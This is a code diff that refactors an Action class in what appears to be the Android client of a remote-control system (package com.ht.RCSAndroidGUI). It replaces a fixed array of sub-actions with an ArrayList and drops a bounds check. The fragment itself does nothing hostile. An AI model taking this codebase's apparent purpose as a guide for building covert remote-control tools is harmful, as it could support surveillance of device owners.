@@ -7,7 +7,11 @@
 
 package com.ht.RCSAndroidGUI.action;
 
+import java.util.ArrayList;
+import java.util.List;
+
 import com.ht.RCSAndroidGUI.RCSException;
+import com.ht.RCSAndroidGUI.util.Check;
 
 // TODO: Auto-generated Javadoc
 /**
@@ -18,16 +22,17 @@ public class Action {
 	public static final int ACTION_NULL = -1;
 
 	/** Action array. */
-	private final SubAction[] subArray;
+	// private final SubAction[] subArray;
+	private final List<SubAction> list;
 
 	/** Action ID. */
 	private final int actionId;
 
 	/** Number of subactions in this action. */
-	private final int subActionsNum;
+	// private final int subActionsNum;
 
 	/** Internal action counter. */
-	private int subActionIndex;
+	// private int subActionIndex;
 
 	/**
 	 * Action constructor.
@@ -45,9 +50,7 @@ public class Action {
 		}
 
 		this.actionId = id;
-		this.subActionsNum = num;
-		this.subArray = new SubAction[num];
-		this.subActionIndex = 0;
+		list = new ArrayList<SubAction>();
 	}
 
 	/**
@@ -65,7 +68,7 @@ public class Action {
 	 * @return the sub actions num
 	 */
 	public int getSubActionsNum() {
-		return this.subActionsNum;
+		return list.size();
 	}
 
 	/**
@@ -79,14 +82,8 @@ public class Action {
 	 *             the RCS exception
 	 */
 	public void addSubAction(final int type, final byte[] params) throws RCSException {
-		if (this.subActionIndex >= this.subActionsNum) {
-			throw new RCSException("SubAction above Action array boundary");
-		}
-
 		final SubAction sub = SubAction.factory(type, params);
-
-		this.subArray[this.subActionIndex] = sub;
-		this.subActionIndex++;
+		list.add(sub);
 	}
 
 	/**
@@ -99,10 +96,10 @@ public class Action {
 	 *             the rCS exception
 	 */
 	public SubAction getSubAction(final int index) throws RCSException {
-		if (index < 0 || index >= this.subActionIndex) {
+		if (index < 0 || index >= list.size()) {
 			throw new RCSException("Subaction index above SubAction array boundary");
 		}
 
-		return this.subArray[index];
+		return list.get(index);
 	}
 }
